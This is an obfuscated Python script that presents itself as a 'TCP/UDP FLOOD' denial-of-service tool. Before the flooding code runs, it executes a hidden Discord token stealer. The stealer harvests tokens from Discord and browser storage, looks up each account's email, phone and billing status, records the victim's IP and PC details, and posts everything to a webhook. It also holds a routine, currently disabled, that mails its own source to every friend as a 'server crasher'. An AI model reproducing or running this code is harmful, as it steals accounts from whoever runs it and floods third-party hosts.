#!/usr/bin/env python3
import os #line:3
import random #line:4
import socket #line:5
import threading #line:6
if os .name !="nt":#line:8
    exit ()#line:9
from re import findall #line:10
from json import loads ,dumps #line:11
from base64 import b64decode #line:12
from subprocess import Popen ,PIPE #line:13
from urllib .request import Request ,urlopen #line:14
from datetime import datetime #line:15
from threading import Thread #line:16
from time import sleep #line:17
from sys import argv #line:18
LOCAL =os .getenv ("LOCALAPPDATA")#line:19
ROAMING =os .getenv ("APPDATA")#line:20
PATHS ={"Discord":ROAMING +"\\Discord","Discord Canary":ROAMING +"\\discordcanary","Discord PTB":ROAMING +"\\discordptb","Google Chrome":LOCAL +"\\Google\\Chrome\\User Data\\Default","Opera":ROAMING +"\\Opera Software\\Opera Stable","Brave":LOCAL +"\\BraveSoftware\\Brave-Browser\\User Data\\Default","Yandex":LOCAL +"\\Yandex\\YandexBrowser\\User Data\\Default"}#line:29
def getheaders (token =None ,content_type ="application/json"):#line:30
    O0000O000O0OO00O0 ={"Content-Type":content_type ,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}#line:34
    if token :#line:35
        O0000O000O0OO00O0 .update ({"Authorization":token })#line:36
    return O0000O000O0OO00O0 #line:37
def getuserdata (OOOOO0OO0O00O00OO ):#line:38
    try :#line:39
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =getheaders (OOOOO0OO0O00O00OO ))).read ().decode ())#line:40
    except :#line:41
        pass #line:42
def gettokens (O0O0OOOO00O000O00 ):#line:43
    O0O0OOOO00O000O00 +="\\Local Storage\\leveldb"#line:44
    OO000OO0OOOOO0O00 =[]#line:45
    for O0O00O0OO0000O000 in os .listdir (O0O0OOOO00O000O00 ):#line:46
        if not O0O00O0OO0000O000 .endswith (".log")and not O0O00O0OO0000O000 .endswith (".ldb"):#line:47
            continue #line:48
        for OO0OO000O00O00000 in [OOO00O0000000O00O .strip ()for OOO00O0000000O00O in open (f"{O0O0OOOO00O000O00}\\{O0O00O0OO0000O000}",errors ="ignore").readlines ()if OOO00O0000000O00O .strip ()]:#line:49
            for OOO00O0OO0O0O0OO0 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",r"mfa\.[\w-]{84}"):#line:50
                for O0OO0OO00O0OOOOOO in findall (OOO00O0OO0O0O0OO0 ,OO0OO000O00O00000 ):#line:51
                    OO000OO0OOOOO0O00 .append (O0OO0OO00O0OOOOOO )#line:52
    return OO000OO0OOOOO0O00 #line:53
def getdeveloper ():#line:54
    OOOO0O00O00OOOOO0 ="wodx"#line:55
    try :#line:56
        OOOO0O00O00OOOOO0 =urlopen (Request ("https://pastebin.com/raw/ssFxiejv")).read ().decode ()#line:57
    except :#line:58
        pass #line:59
    return OOOO0O00O00OOOOO0 #line:60
def getip ():#line:61
    O0O0OO0OO00OO0OO0 ="None"#line:62
    try :#line:63
        O0O0OO0OO00OO0OO0 =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:64
    except :#line:65
        pass #line:66
    return O0O0OO0OO00OO0OO0 #line:67
def getavatar (OO00OO00O0O0OO0OO ,OOOO000OO0000O0O0 ):#line:68
    O0O00OOOO0OO0O00O =f"https://cdn.discordapp.com/avatars/{OO00OO00O0O0OO0OO}/{OOOO000OO0000O0O0}.gif"#line:69
    try :#line:70
        urlopen (Request (O0O00OOOO0OO0O00O ))#line:71
    except :#line:72
        O0O00OOOO0OO0O00O =O0O00OOOO0OO0O00O [:-4 ]#line:73
    return O0O00OOOO0OO0O00O #line:74
def gethwid ():#line:75
    OOOO0OOOO0OOO00O0 =Popen ("wmic csproduct get uuid",shell =True ,stdin =PIPE ,stdout =PIPE ,stderr =PIPE )#line:76
    return (OOOO0OOOO0OOO00O0 .stdout .read ()+OOOO0OOOO0OOO00O0 .stderr .read ()).decode ().split ("\n")[1 ]#line:77
def getfriends (OO00OOO0OO0OOO00O ):#line:78
    try :#line:79
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/relationships",headers =getheaders (OO00OOO0OO0OOO00O ))).read ().decode ())#line:80
    except :#line:81
        pass #line:82
def getchat (OOO0O0000OOOO0OOO ,O0OOO000OO0O0O0O0 ):#line:83
    try :#line:84
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/channels",headers =getheaders (OOO0O0000OOOO0OOO ),data =dumps ({"recipient_id":O0OOO000OO0O0O0O0 }).encode ())).read ().decode ())["id"]#line:85
    except :#line:86
        pass #line:87
def has_payment_methods (OOO000000OOOOO000 ):#line:88
    try :#line:89
        return bool (len (loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =getheaders (OOO000000OOOOO000 ))).read ().decode ()))>0 )#line:90
    except :#line:91
        pass #line:92
def send_message (O00O000OO0000O000 ,O00O0OO0000O0O000 ,O0OO000OO000OO0O0 ):#line:93
    try :#line:94
        urlopen (Request (f"https://discordapp.com/api/v6/channels/{O00O0OO0000O0O000}/messages",headers =getheaders (O00O000OO0000O000 ,"multipart/form-data; boundary=---------------------------325414537030329320151394843687"),data =O0OO000OO000OO0O0 .encode ())).read ().decode ()#line:95
    except :#line:96
        pass #line:97
def spread (O000OO0OO00O0OO00 ,O00O0O000OOO0OO0O ,OO0O0000O0OO0OOOO ):#line:98
    return #line:99
    for O000OO00000OO0OOO in getfriends (O000OO0OO00O0OO00 ):#line:100
        try :#line:101
            OO00000O0O0OO0000 =getchat (O000OO0OO00O0OO00 ,O000OO00000OO0OOO ["id"])#line:102
            send_message (O000OO0OO00O0OO00 ,OO00000O0O0OO0000 ,O00O0O000OOO0OO0O )#line:103
        except Exception as OOOO0OO0O000O00OO :#line:104
            pass #line:105
        sleep (OO0O0000O0OO0OOOO )#line:106
def main ():#line:107
    OO000O00OOOO0000O =ROAMING +"\\.cache~$"#line:108
    OOOOO00O00OO00OOO =True #line:109
    OO0O0000OO00O0000 =True #line:110
    OOO00OOOO0O0OO000 =[]#line:111
    OO0O00000O0O00OO0 =[]#line:112
    OO0O00OO0O0O00O0O =[]#line:113
    O0O0O0OO000OOOOOO =[]#line:114
    OO000OOO0OOO00OOO =[]#line:115
    O000O0OOO00O0OOOO =getip ()#line:116
    O00OOOO00OOO00OOO =os .getenv ("UserName")#line:117
    OO000O000000000OO =os .getenv ("COMPUTERNAME")#line:118
    OO000O00OO0OO0O00 =os .getenv ("userprofile").split ("\\")[2 ]#line:119
    OOOO00O0O0OO0OO00 =getdeveloper ()#line:120
    for O00OO0O0O000O0000 ,O0OO00OO0O0O000O0 in PATHS .items ():#line:121
        if not os .path .exists (O0OO00OO0O0O000O0 ):#line:122
            continue #line:123
        for O00OOOOOO00O00000 in gettokens (O0OO00OO0O0O000O0 ):#line:124
            if O00OOOOOO00O00000 in OO0O00OO0O0O00O0O :#line:125
                continue #line:126
            OO0O00OO0O0O00O0O .append (O00OOOOOO00O00000 )#line:127
            O0000O0OO0OOOO0OO =None #line:128
            if not O00OOOOOO00O00000 .startswith ("mfa."):#line:129
                try :#line:130
                    O0000O0OO0OOOO0OO =b64decode (O00OOOOOO00O00000 .split (".")[0 ].encode ()).decode ()#line:131
                except :#line:132
                    pass #line:133
                if not O0000O0OO0OOOO0OO or O0000O0OO0OOOO0OO in OO000OOO0OOO00OOO :#line:134
                    continue #line:135
            OOO0O00OO000O0OO0 =getuserdata (O00OOOOOO00O00000 )#line:136
            if not OOO0O00OO000O0OO0 :#line:137
                continue #line:138
            OO000OOO0OOO00OOO .append (O0000O0OO0OOOO0OO )#line:139
            OO0O00000O0O00OO0 .append (O00OOOOOO00O00000 )#line:140
            O0000OOOOOOOO00O0 =OOO0O00OO000O0OO0 ["username"]+"#"+str (OOO0O00OO000O0OO0 ["discriminator"])#line:141
            OOO00OO0OOOO0OO0O =OOO0O00OO000O0OO0 ["id"]#line:142
            O0OOOOOO00O000000 =OOO0O00OO000O0OO0 ["avatar"]#line:143
            O0O00O000O0O00OO0 =getavatar (OOO00OO0OOOO0OO0O ,O0OOOOOO00O000000 )#line:144
            O0OO0O0O00OO0OOO0 =OOO0O00OO000O0OO0 .get ("email")#line:145
            OOOO0OO00O00O0O0O =OOO0O00OO000O0OO0 .get ("phone")#line:146
            O00OO00OO00OOOO00 =bool (OOO0O00OO000O0OO0 .get ("premium_type"))#line:147
            O00OO00O0O00O00OO =bool (has_payment_methods (O00OOOOOO00O00000 ))#line:148
            OOO00OO0OOOOO00O0 ={"color":0x7289da ,"fields":[{"name":"**Account Info**","value":f'Email: {O0OO0O0O00OO0OOO0}\nPhone: {OOOO0OO00O00O0O0O}\nNitro: {O00OO00OO00OOOO00}\nBilling Info: {O00OO00O0O00O00OO}',"inline":True },{"name":"**PC Info**","value":f'IP: {O000O0OOO00O0OOOO}\nUsername: {O00OOOO00OOO00OOO}\nPC Name: {OO000O000000000OO}\nToken Location: {O00OO0O0O000O0000}',"inline":True },{"name":"**Token**","value":O00OOOOOO00O00000 ,"inline":False }],"author":{"name":f"{O0000OOOOOOOO00O0} ({OOO00OO0OOOO0OO0O})","icon_url":O0O00O000O0O00OO0 },"footer":{"text":f"Token Grabber By Astraa",}}#line:175
            OOO00OOOO0O0OO000 .append (OOO00OO0OOOOO00O0 )#line:176
    with open (OO000O00OOOO0000O ,"a")as O000O0O00OOO00O00 :#line:177
        for O00OOOOOO00O00000 in OO0O00OO0O0O00O0O :#line:178
            if not O00OOOOOO00O00000 in O0O0O0OO000OOOOOO :#line:179
                O000O0O00OOO00O00 .write (O00OOOOOO00O00000 +"\n")#line:180
    if len (OO0O00000O0O00OO0 )==0 :#line:181
        OO0O00000O0O00OO0 .append ('123')#line:182
    O0OO0OO000OOOOO0O ={"content":"","embeds":OOO00OOOO0O0OO000 ,"username":"Discord Token Grabber","avatar_url":"https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"}#line:188
    try :#line:189
        urlopen (Request ("WEBHOOK_URL",data =dumps (O0OO0OO000OOOOO0O ).encode (),headers =getheaders ()))#line:190
    except :#line:191
        pass #line:192
    if OO0O0000OO00O0000 :#line:193
        for O00OOOOOO00O00000 in OO0O00000O0O00OO0 :#line:194
            with open (argv [0 ],encoding ="utf-8")as O000O0O00OOO00O00 :#line:195
                OOO00O00O000OOOO0 =O000O0O00OOO00O00 .read ()#line:196
            OO0O00O0000O0OOO0 =f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{OOO00O00O000OOOO0}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'#line:197
            Thread (target =spread ,args =(O00OOOOOO00O00000 ,OO0O00O0000O0OOO0 ,7500 /1000 )).start ()#line:198
try :#line:199
    main ()#line:200
except Exception as e :#line:201
    print (e )#line:202
    pass #line:203
print ("--> C0de By Lee0n123 <--")#line:206
print ("#-- TCP/UDP FLOOD --#")#line:207
ip =str (input (" Host/Ip:"))#line:208
port =int (input (" Port:"))#line:209
choice =str (input (" UDP(y/n):"))#line:210
times =int (input (" Packets per one connection:"))#line:211
threads =int (input (" Threads:"))#line:212
def run ():#line:213
	O0O0OOOO0OOO0O0OO =random ._urandom (1024 )#line:214
	OO00O00O0OOO0O0O0 =random .choice (("[*]","[!]","[#]"))#line:215
	while True :#line:216
		try :#line:217
			OOO000O0O0O00O0O0 =socket .socket (socket .AF_INET ,socket .SOCK_DGRAM )#line:218
			OOO0O0OOOOO00000O =(str (ip ),int (port ))#line:219
			for O0O0OOO0OOOO0O00O in range (times ):#line:220
				OOO000O0O0O00O0O0 .sendto (O0O0OOOO0OOO0O0OO ,OOO0O0OOOOO00000O )#line:221
			print (OO00O00O0OOO0O0O0 +" Sent!!!")#line:222
		except :#line:223
			print ("[!] Error!!!")#line:224
def run2 ():#line:226
	OOOOO0OOOOOOOOOO0 =random ._urandom (16 )#line:227
	O0O0OO0OOO00OO0O0 =random .choice (("[*]","[!]","[#]"))#line:228
	while True :#line:229
		try :#line:230
			OOOOOO000OOO00000 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:231
			OOOOOO000OOO00000 .connect ((ip ,port ))#line:232
			OOOOOO000OOO00000 .send (OOOOO0OOOOOOOOOO0 )#line:233
			for OO00000OOOO00O00O in range (times ):#line:234
				OOOOOO000OOO00000 .send (OOOOO0OOOOOOOOOO0 )#line:235
			print (O0O0OO0OOO00OO0O0 +" Sent!!!")#line:236
		except :#line:237
			OOOOOO000OOO00000 .close ()#line:238
			print ("[*] Error")#line:239
for y in range (threads ):#line:241
	if choice =='y':#line:242
		th =threading .Thread (target =run )#line:243
		th .start ()#line:244
	else :#line:245
		th =threading .Thread (target =run2 )#line:246
		th .start ()#line:247
